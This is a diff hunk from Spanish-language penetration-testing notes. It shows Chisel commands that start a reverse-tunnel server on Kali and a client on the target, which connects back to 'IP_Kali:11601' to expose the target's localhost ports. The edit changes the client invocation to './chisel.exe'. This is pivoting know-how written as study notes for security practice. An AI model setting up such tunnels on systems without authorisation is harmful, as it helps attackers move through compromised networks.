@@ -39,7 +39,7 @@ NOTA: Funciona muy bien para traer servicios en el 'localhost' de la máquina v�
 ❯ ./chisel_linux server --reverse -p 11601       # Crear el server en Kali 
 	# Port-Server = Puerto a abrir en Kali
 
-❯ chisel client IP_Kali:11601 R:<Port-Local-a-Abrir>:127.0.0.1:<Port-Traer>    # Levantar el cliente 
+❯ ./chisel.exe client IP_Kali:11601 R:<Port-Local-a-Abrir>:127.0.0.1:<Port-Traer>    # Levantar el cliente 
 
 	# R = Remote Port Forwarding
 	# Port-Local-a-Abrir = Puerto en Kali donde escuchará 
